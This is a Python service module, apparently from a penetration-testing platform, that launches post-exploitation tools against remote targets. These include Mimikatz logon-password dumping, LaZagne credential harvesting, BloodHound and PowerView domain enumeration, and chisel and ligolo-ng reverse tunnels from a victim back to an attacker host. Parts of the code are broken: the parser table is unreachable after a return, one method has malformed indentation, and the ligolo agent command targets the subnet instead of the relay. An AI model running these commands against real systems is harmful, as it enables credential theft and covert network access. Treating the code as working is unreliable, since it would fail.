"""
Moderno servicio de Post-Exploitation alineado con las reglas del proyecto.
"""

import logging
from pathlib import Path
from typing import Any, Dict, Optional

from repositories import ScanRepository
from utils.validators import CommandSanitizer, IPValidator
from utils.parsers.postexploit_parser import (
    LinPEASParser,
    WinPEASParser,
    BloodHoundParser,
    MimikatzParser,
    PowerViewParser,
    SeatbeltParser,
)

from services.post_exploitation.executor import PostExploitExecutor
from services.post_exploitation import command_builders, manual_guides

logger = logging.getLogger(__name__)

TIMEOUTS = {
    'linpeas': 600,
    'winpeas': 600,
    'bloodhound': 1800,
    'mimikatz': 300,
    'powerview': 600,
    'seatbelt': 300,
    'lazagne': 300,
}

MANUAL_TOOLS = {'ssh_pivot', 'chisel', 'ligolo'}


class PostExploitationService:
    """Orquesta la ejecución de herramientas de post-explotación."""
    
    def __init__(self, scan_repository: Optional[ScanRepository] = None) -> None:
        self.scan_repo = scan_repository or ScanRepository()
        # output_dir se obtiene dinámicamente por workspace
        # Mantener fallback para compatibilidad (usar tmp del proyecto)
        from utils.workspace_filesystem import PROJECT_TMP_DIR
        self.output_dir = PROJECT_TMP_DIR / 'postexploit'
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.executor = PostExploitExecutor(self.scan_repo, TIMEOUTS, self.output_dir)
    
    def _get_workspace_output_dir(self, scan_id: int) -> Path:
        """
        Obtiene directorio de output del workspace para un scan.
        
        Args:
            scan_id: ID del scan
        
        Returns:
            Path al directorio de output del workspace
        """
        from utils.workspace_filesystem import get_workspace_output_dir_from_scan
        return get_workspace_output_dir_from_scan(scan_id, 'postexploit')

        self.parsers = {
            'linpeas': LinPEASParser(),
            'winpeas': WinPEASParser(),
            'bloodhound': BloodHoundParser(),
            'mimikatz': MimikatzParser(),
            'powerview': PowerViewParser(),
            'seatbelt': SeatbeltParser(),
            'lazagne': None,
        }

    # ---------- PUBLIC API ----------
    def run_linpeas(
        self,
        *,
        target: Optional[str],
        workspace_id: int,
        user_id: int,
        local: bool,
        ssh_user: Optional[str],
        ssh_pass: Optional[str],
    ) -> Dict[str, Any]:
        if not local:
            if not target:
                raise ValueError('target is required for remote LinPEAS')
            IPValidator.validate(target)
        scan = self._create_scan(target or 'localhost', workspace_id, user_id, {'tool': 'linpeas', 'local': local})
        command = command_builders.linpeas_command(local, target, ssh_user, ssh_pass)
        self._launch_tool(scan, 'linpeas', command, self._output_file('linpeas', scan.id))
        return self._scan_response(scan.id, 'linpeas', scan.target)

    def run_winpeas(
        self,
        *,
        target: str,
        workspace_id: int,
        user_id: int,
        local: bool,
        username: Optional[str],
        password: Optional[str],
    ) -> Dict[str, Any]:
        if not local:
            IPValidator.validate(target)
        scan = self._create_scan(target, workspace_id, user_id, {'tool': 'winpeas', 'local': local})
        command = command_builders.winpeas_command(local, target, username, password)
        self._launch_tool(scan, 'winpeas', command, self._output_file('winpeas', scan.id))
        return self._scan_response(scan.id, 'winpeas', target)

    def run_bloodhound(
        self,
        *,
        domain: str,
        workspace_id: int,
        user_id: int,
        username: str,
        password: str,
        collection_method: str,
        dc_ip: Optional[str],
    ) -> Dict[str, Any]:
        options = {'tool': 'bloodhound', 'collection_method': collection_method}
        scan = self._create_scan(domain, workspace_id, user_id, options)
        output_dir = str(self.output_dir / f'bloodhound_{scan.id}')
        Path(output_dir).mkdir(parents=True, exist_ok=True)
        command = command_builders.bloodhound_command(domain, username, password, collection_method, dc_ip)
        self._launch_tool(scan, 'bloodhound', command, output_dir)
        return self._scan_response(scan.id, 'bloodhound', domain)

    def run_mimikatz(
        self,
        *,
        target: str,
        workspace_id: int,
        user_id: int,
        username: str,
        password: str,
        command: str,
    ) -> Dict[str, Any]:
        IPValidator.validate(target)
        scan = self._create_scan(target, workspace_id, user_id, {'tool': 'mimikatz', 'command': command})
        cmd = command_builders.mimikatz_command(target, username, password, command)
        self._launch_tool(scan, 'mimikatz', cmd, self._output_file('mimikatz', scan.id))
        return self._scan_response(scan.id, 'mimikatz', target)

    def run_powerview(
        self,
        *,
        target: str,
        workspace_id: int,
        user_id: int,
        username: str,
        password: str,
        command: str,
    ) -> Dict[str, Any]:
        IPValidator.validate(target)
        scan = self._create_scan(target, workspace_id, user_id, {'tool': 'powerview', 'command': command})
        cmd = command_builders.powerview_command(target, username, password, command)
        self._launch_tool(scan, 'powerview', cmd, self._output_file('powerview', scan.id))
        return self._scan_response(scan.id, 'powerview', target)

    def run_seatbelt(
        self,
        *,
        target: str,
        workspace_id: int,
        user_id: int,
        username: str,
        password: str,
        group: str,
    ) -> Dict[str, Any]:
        IPValidator.validate(target)
        scan = self._create_scan(target, workspace_id, user_id, {'tool': 'seatbelt', 'group': group})
        cmd = command_builders.seatbelt_command(target, username, password, group)
        self._launch_tool(scan, 'seatbelt', cmd, self._output_file('seatbelt', scan.id))
        return self._scan_response(scan.id, 'seatbelt', target)

    def run_lazagne(
        self,
        *,
        target: str,
        workspace_id: int,
        user_id: int,
        mode: str,
    ) -> Dict[str, Any]:
        scan = self._create_scan(target, workspace_id, user_id, {'tool': 'lazagne', 'mode': mode})
        cmd = command_builders.lazagne_command(mode or 'all')
        self._launch_tool(scan, 'lazagne', cmd, self._output_file('lazagne', scan.id))
        return self._scan_response(scan.id, 'lazagne', target)

    # Manual helpers -------------------------------------------------
    def run_ssh_pivot(
        self,
        *,
        workspace_id: int,
        user_id: int,
        jump_host: str,
        jump_user: str,
        remote_host: str,
        remote_port: int,
        local_port: int,
    ) -> Dict[str, Any]:
        scan = self._create_scan(jump_host, workspace_id, user_id, {'tool': 'ssh_pivot'})
        content = manual_guides.ssh_pivot_instructions(jump_host, jump_user, local_port, remote_host, remote_port)
        self._store_manual_output(scan, 'ssh_pivot', content)
        return self._manual_response(scan.id, 'ssh_pivot', content)

    def run_chisel(
        self,
        *,
        workspace_id: int,
        user_id: int,
        attacker_host: str,
        attacker_port: int,
        remote_host: str,
        remote_port: int,
        bind_port: int,
    ) -> Dict[str, Any]:
        scan = self._create_scan(attacker_host, workspace_id, user_id, {'tool': 'chisel'})
        content = manual_guides.chisel_instructions(attacker_host, attacker_port, remote_host, remote_port, bind_port)
        self._store_manual_output(scan, 'chisel', content)
        return self._manual_response(scan.id, 'chisel', content)

    def run_ligolo(
        self,
        *,
        workspace_id: int,
        user_id: int,
        relay_port: int,
        agent_port: int,
        target_subnet: str,
    ) -> Dict[str, Any]:
        scan = self._create_scan(target_subnet, workspace_id, user_id, {'tool': 'ligolo'})
        content = manual_guides.ligolo_instructions(relay_port, agent_port, target_subnet)
        self._store_manual_output(scan, 'ligolo', content)
        return self._manual_response(scan.id, 'ligolo', content)
    
    def get_scan_results(self, scan_id: int) -> Dict[str, Any]:
        scan = self.scan_repo.find_by_id(scan_id)
        if not scan:
            raise ValueError(f'Scan {scan_id} not found')
        tool = scan.options.get('tool')
        if scan.status != 'completed':
            return {'scan_id': scan_id, 'status': scan.status, 'message': 'Scan not completed yet'}

        if tool in MANUAL_TOOLS:
            output = self._read_file(self._output_file(tool, scan_id))
            return {
                'scan_id': scan_id,
                'tool': tool,
                'status': 'completed',
                'results': manual_guides.instructions_payload(output),
            }

        parser = self.parsers.get(tool)
        if not parser:
            return {'scan_id': scan_id, 'error': f'Unknown tool {tool}'}
        results = self._parse_output(tool, scan_id, parser)
        return {
            'scan_id': scan_id,
            'status': 'completed',
            'tool': tool,
            'results': results,
            'scan_info': self._scan_meta(scan),
        }

    # ---------- HELPERS ----------
    def _launch_tool(self, scan, tool: str, command: Any, output_path: str) -> None:
        sanitized = CommandSanitizer.sanitize_command(command[0], command[1:])
        self.executor.run_async(scan.id, sanitized, output_path, tool)
        self.scan_repo.update_status(scan, 'running')

    def _create_scan(self, target: str, workspace_id: int, user_id: int, options: Dict[str, Any]):
        return self.scan_repo.create(
            scan_type='post_exploitation',
            target=target,
            workspace_id=workspace_id,
            user_id=user_id,
            options=options,
        )

    def _output_file(self, tool: str, scan_id: int) -> str:
        """Obtiene path del archivo de output usando workspace directory."""
        workspace_output_dir = self._get_workspace_output_dir(scan_id)
        return str(workspace_output_dir / f'{tool}_{scan_id}.txt')

    def _scan_response(self, scan_id: int, tool: str, target: str) -> Dict[str, Any]:
        return {'scan_id': scan_id, 'status': 'running', 'tool': tool, 'target': target}

    def _manual_response(self, scan_id: int, tool: str, content: str) -> Dict[str, Any]:
            return {
                'scan_id': scan_id,
            'status': 'completed',
            'tool': tool,
            'results': manual_guides.instructions_payload(content),
        }

    def _store_manual_output(self, scan, tool: str, content: str) -> None:
        path = self._output_file(tool, scan.id)
        with open(path, 'w', encoding='utf-8') as handler:
            handler.write(content)
        self.scan_repo.update_status(scan, 'completed')
        self.scan_repo.update_progress(scan, 100, content[:250])

    def _read_file(self, path: str) -> str:
        file_path = Path(path)
        if not file_path.exists():
            return ''
        return file_path.read_text(encoding='utf-8')

    def _scan_meta(self, scan) -> Dict[str, Optional[str]]:
        return {
            'target': scan.target,
            'started_at': scan.started_at.isoformat() if scan.started_at else None,
            'completed_at': scan.completed_at.isoformat() if scan.completed_at else None,
        }

    def _parse_output(self, tool: str, scan_id: int, parser) -> Dict[str, Any]:
        if tool == 'bloodhound':
            output_dir = self.output_dir / f'bloodhound_{scan_id}'
            json_files = list(output_dir.glob('*.json'))
            if json_files:
                return parser.parse_json(str(json_files[0]))
            return {'error': 'No JSON files found'}
        output_file = Path(self._output_file(tool, scan_id))
        if not output_file.exists():
            return {'error': f'Output for {tool} not found'}
        if parser is None:
            return {'raw_output': output_file.read_text(encoding='utf-8')}
        return parser.parse_output(output_file.read_text(encoding='utf-8'))
    
    # ============================================
    # PREVIEW METHODS
    # ============================================
    
    def preview_linpeas(
        self,
        workspace_id: int,
        local: bool,
        target: Optional[str] = None,
        ssh_user: Optional[str] = None,
        ssh_pass: Optional[str] = None
    ) -> Dict[str, Any]:
        """Preview del comando LinPEAS."""
        if not local and not target:
            raise ValueError('target is required for remote LinPEAS')
        if not local:
            IPValidator.validate(target)
        
        command = command_builders.linpeas_command(local, target, ssh_user, ssh_pass)
        command_str = ' '.join([str(c) for c in command])
        output_file = f'/workspaces/workspace_{workspace_id}/postexploit/linpeas_{{scan_id}}.txt'
        
        return {
            'command': command,
            'command_string': command_str,
            'parameters': {
                'local': local,
                'target': target,
                'ssh_user': ssh_user,
                'ssh_pass': '***' if ssh_pass else None
            },
            'estimated_timeout': TIMEOUTS.get('linpeas', 600),
            'output_file': output_file,
            'warnings': [],
            'suggestions': []
        }
    
    def preview_winpeas(
        self,
        workspace_id: int,
        target: str,
        local: bool,
        username: Optional[str] = None,
        password: Optional[str] = None
    ) -> Dict[str, Any]:
        """Preview del comando WinPEAS."""
        if not local:
            IPValidator.validate(target)
        
        command = command_builders.winpeas_command(local, target, username, password)
        command_str = ' '.join([str(c) for c in command])
        output_file = f'/workspaces/workspace_{workspace_id}/postexploit/winpeas_{{scan_id}}.txt'
        
        return {
            'command': command,
            'command_string': command_str,
            'parameters': {
                'target': target,
                'local': local,
                'username': username,
                'password': '***' if password else None
            },
            'estimated_timeout': TIMEOUTS.get('winpeas', 600),
            'output_file': output_file,
            'warnings': [],
            'suggestions': []
        }
    
    def preview_mimikatz(
        self,
        workspace_id: int,
        target: str,
        username: str,
        password: str,
        command: str = 'sekurlsa::logonpasswords'
    ) -> Dict[str, Any]:
        """Preview del comando Mimikatz."""
        IPValidator.validate(target)
        
        cmd = command_builders.mimikatz_command(target, username, password, command)
        command_str = ' '.join([str(c) for c in cmd])
        output_file = f'/workspaces/workspace_{workspace_id}/postexploit/mimikatz_{{scan_id}}.txt'
        
        return {
            'command': cmd,
            'command_string': command_str,
            'parameters': {
                'target': target,
                'username': username,
                'password': '***',
                'command': command
            },
            'estimated_timeout': TIMEOUTS.get('mimikatz', 300),
            'output_file': output_file,
            'warnings': ['Mimikatz puede ser detectado por antivirus'],
            'suggestions': []
        }
    
    def preview_seatbelt(
        self,
        workspace_id: int,
        target: str,
        username: str,
        password: str,
        group: str = 'all'
    ) -> Dict[str, Any]:
        """Preview del comando Seatbelt."""
        IPValidator.validate(target)
        
        cmd = command_builders.seatbelt_command(target, username, password, group)
        command_str = ' '.join([str(c) for c in cmd])
        output_file = f'/workspaces/workspace_{workspace_id}/postexploit/seatbelt_{{scan_id}}.txt'
        
        return {
            'command': cmd,
            'command_string': command_str,
            'parameters': {
                'target': target,
                'username': username,
                'password': '***',
                'group': group
            },
            'estimated_timeout': TIMEOUTS.get('seatbelt', 300),
            'output_file': output_file,
            'warnings': [],
            'suggestions': []
        }
    
    def preview_ssh_pivot(
        self,
        workspace_id: int,
        jump_host: str,
        jump_user: str,
        remote_host: str,
        remote_port: int,
        local_port: int
    ) -> Dict[str, Any]:
        """Preview de SSH Pivot (manual)."""
        IPValidator.validate(jump_host)
        IPValidator.validate(remote_host)
        
        command_str = f'ssh -L {local_port}:{remote_host}:{remote_port} {jump_user}@{jump_host}'
        output_file = f'/workspaces/workspace_{workspace_id}/postexploit/ssh_pivot_{{scan_id}}.txt'
        
        return {
            'command': ['ssh', '-L', f'{local_port}:{remote_host}:{remote_port}', f'{jump_user}@{jump_host}'],
            'command_string': command_str,
            'parameters': {
                'jump_host': jump_host,
                'jump_user': jump_user,
                'remote_host': remote_host,
                'remote_port': remote_port,
                'local_port': local_port
            },
            'estimated_timeout': 0,  # Manual, no timeout
            'output_file': output_file,
            'warnings': ['Este es un comando manual que requiere ejecución interactiva'],
            'suggestions': ['Ejecutar en terminal separada para mantener la conexión']
        }
    
    def preview_chisel(
        self,
        workspace_id: int,
        attacker_host: str,
        attacker_port: int,
        remote_host: str,
        remote_port: int,
        bind_port: int
    ) -> Dict[str, Any]:
        """Preview de Chisel (manual)."""
        IPValidator.validate(attacker_host)
        IPValidator.validate(remote_host)
        
        server_cmd = f'chisel server --port {attacker_port} --reverse'
        client_cmd = f'chisel client {attacker_host}:{attacker_port} R:{bind_port}:{remote_host}:{remote_port}'
        command_str = f'Server: {server_cmd}\nClient: {client_cmd}'
        output_file = f'/workspaces/workspace_{workspace_id}/postexploit/chisel_{{scan_id}}.txt'
        
        return {
            'command': ['chisel'],
            'command_string': command_str,
            'parameters': {
                'attacker_host': attacker_host,
                'attacker_port': attacker_port,
                'remote_host': remote_host,
                'remote_port': remote_port,
                'bind_port': bind_port
            },
            'estimated_timeout': 0,  # Manual
            'output_file': output_file,
            'warnings': ['Requiere ejecutar servidor y cliente por separado'],
            'suggestions': ['Ejecutar servidor en atacante, cliente en víctima']
        }
    
    def preview_ligolo(
        self,
        workspace_id: int,
        relay_port: int,
        agent_port: int,
        target_subnet: str
    ) -> Dict[str, Any]:
        """Preview de Ligolo (manual)."""
        relay_cmd = f'./ligolo-ng -selfcert -laddr 0.0.0.0:{relay_port}'
        agent_cmd = f'./ligolo-ng -connect {target_subnet}:{relay_port}'
        command_str = f'Relay: {relay_cmd}\nAgent: {agent_cmd}'
        output_file = f'/workspaces/workspace_{workspace_id}/postexploit/ligolo_{{scan_id}}.txt'
        
        return {
            'command': ['ligolo-ng'],
            'command_string': command_str,
            'parameters': {
                'relay_port': relay_port,
                'agent_port': agent_port,
                'target_subnet': target_subnet
            },
            'estimated_timeout': 0,  # Manual
            'output_file': output_file,
            'warnings': ['Requiere ejecutar relay y agent por separado'],
            'suggestions': ['Ejecutar relay en atacante, agent en víctima']
        }

